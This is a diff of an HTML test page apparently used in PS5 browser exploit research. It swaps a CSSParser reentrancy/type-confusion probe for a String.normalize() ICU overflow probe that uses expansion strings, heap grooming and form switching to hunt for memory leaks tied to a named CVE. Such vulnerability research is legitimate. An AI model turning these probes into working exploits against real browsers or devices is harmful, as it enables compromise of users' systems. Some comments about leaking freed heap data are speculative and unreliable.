@@ -2,181 +2,219 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 CSSParser Type Confusion Test</title>
+<title>PS5 CVE-2025-43429 - String.normalize() ICU Overflow Test</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-
-
-
-if (window.testRunner) {
-
-    testRunner.dumpAsText();
-
-    testRunner.waitUntilDone();
-
-}
-
-let logText = "";
-
-function log(s) {
-
-    logText += s + "\n";
-
-    console.log(s);
-
-}
-
-function finish() {
-
-    document.body.textContent = logText + "\nDONE";
-
-    if (window.testRunner)
-
-        testRunner.notifyDone();
-
-}
-
-function installGetter(proto, name, callback) {
-
-    const old = Object.getOwnPropertyDescriptor(proto, "then");
-
-    Object.defineProperty(proto, "then", {
-
-        configurable: true,
-
-        get() {
-
-            callback(name);
-
-            if (old)
-
-                Object.defineProperty(proto, "then", old);
-
-            else
-
-                delete proto.then;
-
-            return old && old.value;
-
-        }
-
-    });
-
-}
-
-window.onload = async function () {
-
-    const style = document.createElement("style");
-
-    style.textContent = `
-
-@font-face {
-
-    font-family: "asanff";
-
-    src: local("Arial"), local("Helvetica"), local("DejaVu Sans"), local("sans-serif");
-
-    unicode-range: U+0041;
-
-}
-
-@font-face {
-
-    font-family: "asanff";
-
-    src: local("Arial"), local("Helvetica"), local("DejaVu Sans"), local("sans-serif");
-
-    unicode-range: U+0042;
-
-}
-
-`;
-
-    document.head.appendChild(style);
-
-    const probe = document.createElement("span");
-
-    probe.textContent = "AB";
-
-    probe.style.fontFamily = "asanff";
-
-    document.body.appendChild(probe);
-
-    document.body.offsetTop;
-
-    log("initial style resolved; cssRules=" + style.sheet.cssRules.length);
-
-    let fired = false;
-
-    function reenter(where) {
-
-        if (fired)
-
-            return;
-
-        fired = true;
-
-        log("then getter fired via " + where);
-
-        try {
-
-            style.sheet.deleteRule(0);
-
-            log("deleteRule(0) executed");
-
-        } catch (e) {
-
-            log("deleteRule failed: " + e.name + ": " + e.message);
-
-        }
-
-        try {
-
-            document.body.offsetTop;
-
-            getComputedStyle(probe).fontFamily;
-
-            log("style/layout forced after deleteRule");
-
-        } catch (e) {
-
-            log("style/layout force failed: " + e.name + ": " + e.message);
-
-        }
-
-    }
-
-    installGetter(FontFace.prototype, "FontFace.prototype", reenter);
-
-    installGetter(FontFaceSet.prototype, "FontFaceSet.prototype", reenter);
-
-    installGetter(Array.prototype, "Array.prototype", reenter);
-
-    log("calling document.fonts.load");
-
+L('[*] Starting CVE-2025-43429 String.normalize() ICU overflow test...');
+L('[*] Target: heap buffer overflow in ICU normalization\n');
+
+// ====================================================================
+// Vector 1: Unicode expansion strings
+// ICU allocates output buffer based on input length.
+// Some codepoints EXPAND during normalization (NFKC/NFKD).
+// If ICU underestimates expansion, we get OOB write.
+// If we can read the result, we might get OOB read (info leak).
+// ====================================================================
+
+L('--- Vector 1: NFKC Expansion ---');
+
+// These codepoints expand during NFKC normalization
+// E.g., compatibility characters that decompose into multiple chars
+const expanders = [
+    '\uFDFA',  // ARABIC LIGATURE SALLALLAHOU ALAYHE WASALLAM -> 18 chars
+    '\uFDF2',  // ARABIC LIGATURE ALLAH ISOLATED FORM
+    '\uFB01',  // LATIN SMALL LIGATURE FI
+    '\uFB02',  // LATIN SMALL LIGATURE FL
+    '\uFB03',  // LATIN SMALL LIGATURE FFI
+    '\uFB04',  // LATIN SMALL LIGATURE FFL
+    '\uFB05',  // LATIN SMALL LIGATURE LONG S T
+    '\uFB06',  // LATIN SMALL LIGATURE ST
+    '\u2126',  // OHM SIGN -> OMEGA
+    '\u212B',  // ANGSTROM SIGN -> A + COMBINING RING ABOVE
+    '\uFB00',  // LATIN SMALL LIGATURE FF
+    '\u3371',  // SQUARE HPA -> hPa
+    '\u337B',  // SQUARE ERA NAME HEISEI
+];
+
+for (let i = 0; i < expanders.length; i++) {
     try {
-
-        const faces = await document.fonts.load('16px "asanff"', "AB");
-
-        log("document.fonts.load resolved; faces=" + faces.length);
-
-    } catch (e) {
-
-        log("document.fonts.load rejected: " + e.name + ": " + e.message);
-
+        let input = expanders[i].repeat(100);
+        let output = input.normalize('NFKC');
+        
+        // Check if output is longer than input (expansion happened)
+        if (output.length !== input.length) {
+            L('[+] ' + i + ': Expansion detected! ' + input.length + ' -> ' + output.length);
+        }
+        
+        // Check for garbage/unexpected characters in output
+        for (let j = 0; j < output.length; j++) {
+            let code = output.charCodeAt(j);
+            // Look for control characters or suspiciously high codepoints
+            if (code < 32 && code !== 0) {
+                L('[!] ANOMALY at expander ' + i + ' offset ' + j + ': 0x' + code.toString(16));
+            }
+        }
+    } catch(e) {
+        L('[!] Expander ' + i + ' threw: ' + e.message);
     }
+}
 
-    log("getter fired=" + fired);
+// ====================================================================
+// Vector 2: Long strings with mixed normalization forms
+// ====================================================================
 
-    finish();
+L('\n--- Vector 2: Mixed Long Strings ---');
 
-};
+try {
+    // Mix ASCII with expansion chars to create size mismatch
+    let mixed = '';
+    for (let i = 0; i < 10000; i++) {
+        mixed += 'A' + '\uFDFA' + 'B' + '\u212B';
+    }
+    
+    let norm = mixed.normalize('NFKC');
+    L('[*] Input length: ' + mixed.length);
+    L('[*] Output length: ' + norm.length);
+    L('[*] Expansion ratio: ' + (norm.length / mixed.length).toFixed(2));
+    
+    // Check for anomalies
+    let anomalies = 0;
+    for (let i = 0; i < norm.length; i++) {
+        let code = norm.charCodeAt(i);
+        if (code < 32 && code !== 9 && code !== 10 && code !== 13) {
+            if (anomalies < 5) {
+                L('[!] ANOMALY at offset ' + i + ': 0x' + code.toString(16));
+            }
+            anomalies++;
+        }
+    }
+    if (anomalies > 0) L('[!] Total anomalies: ' + anomalies);
+    else L('[*] No anomalies in mixed string output.');
+    
+} catch(e) {
+    L('[!] Mixed string test threw: ' + e.message);
+}
 
+// ====================================================================
+// Vector 3: Rapid allocation + normalization (heap grooming)
+// ====================================================================
+
+L('\n--- Vector 3: Rapid Alloc + Normalize ---');
+
+try {
+    // Allocate and free strings to leave pointers on heap
+    let garbage = [];
+    for (let i = 0; i < 1000; i++) {
+        garbage.push({a: i.toString(), b: new ArrayBuffer(64)});
+    }
+    garbage = null;
+    
+    // Now normalize small strings that might land in freed slots
+    // If ICU doesn't zero the output buffer, we might read old pointers
+    for (let i = 0; i < 100; i++) {
+        let input = String.fromCharCode(0x212B); // ANGSTROM (expands)
+        let output = input.normalize('NFKC');
+        
+        // The output should be 2 chars: A + COMBINING RING
+        // But if the buffer is larger and not zeroed, we might read past
+        if (output.length > 2) {
+            L('[!] OVERREAD! normalize returned ' + output.length + ' chars (expected 2)');
+            let hex = [];
+            for (let j = 0; j < Math.min(output.length, 16); j++) {
+                hex.push(output.charCodeAt(j).toString(16).padStart(2, '0'));
+            }
+            L('[!] Hex: ' + hex.join(' '));
+            L('[!] THIS IS A LEAK!');
+            break;
+        }
+    }
+    L('[*] Rapid alloc test completed.');
+    
+} catch(e) {
+    L('[!] Rapid alloc test threw: ' + e.message);
+}
+
+// ====================================================================
+// Vector 4: Boundary conditions (empty, single char, max length)
+// ====================================================================
+
+L('\n--- Vector 4: Boundary Conditions ---');
+
+const tests = [
+    { name: 'empty', input: '' },
+    { name: 'single NFKC expander', input: '\uFDFA' },
+    { name: 'null char', input: '\u0000' },
+    { name: 'surrogate pair', input: '\uD83D\uDE00' },
+    { name: 'combining chain', input: 'e\u0301\u0301\u0301\u0301' },
+    { name: 'repeated angstrom x1000', input: '\u212B'.repeat(1000) },
+    { name: 'mixed forms', input: '\uFB01\u212B\uFDFA\uFB03' },
+];
+
+for (const test of tests) {
+    try {
+        let out = test.input.normalize('NFKC');
+        let outLen = out.length;
+        let inLen = test.input.length;
+        
+        if (outLen !== inLen) {
+            L('[+] ' + test.name + ': ' + inLen + ' -> ' + outLen + ' (expansion)');
+        }
+        
+        // Check for non-ASCII garbage in output of simple inputs
+        if (inLen <= 10) {
+            let hex = [];
+            for (let j = 0; j < Math.min(outLen, 16); j++) {
+                hex.push(out.charCodeAt(j).toString(16).padStart(4, '0'));
+            }
+            L('    hex: ' + hex.join(' '));
+        }
+    } catch(e) {
+        L('[!] ' + test.name + ' threw: ' + e.message);
+    }
+}
+
+// ====================================================================
+// Vector 5: Normalization form switching (potential use-after-free)
+// ====================================================================
+
+L('\n--- Vector 5: Form Switching ---');
+
+try {
+    let s = '\u212B'.repeat(100);
+    
+    // Rapidly switch between normalization forms
+    // If ICU caches buffers between forms, we might get stale data
+    let results = [];
+    for (let i = 0; i < 100; i++) {
+        let form = ['NFC', 'NFD', 'NFKC', 'NFKD'][i % 4];
+        let r = s.normalize(form);
+        results.push(r);
+    }
+    
+    // All NFKC results should be identical
+    let firstNFKC = results[2];
+    for (let i = 2; i < results.length; i += 4) {
+        if (results[i] !== firstNFKC) {
+            L('[!] INCONSISTENCY at iteration ' + i + '!');
+            L('[!] NFKC result changed between calls!');
+            L('[!] This indicates stale buffer reuse!');
+            break;
+        }
+    }
+    L('[*] Form switching test completed.');
+    
+} catch(e) {
+    L('[!] Form switching test threw: ' + e.message);
+}
+
+L('\n[*] All tests finished.');
+L('[*] If no anomalies found, we need the exact ICU patch from Bugzilla 298232.');
+L('[*] Go to: https://bugs.webkit.org/show_bug.cgi?id=298232');
+L('[*] Or search GitHub for commit referencing 298232 or normalize + ICU');
 </script>
-
 </body>
 </html>
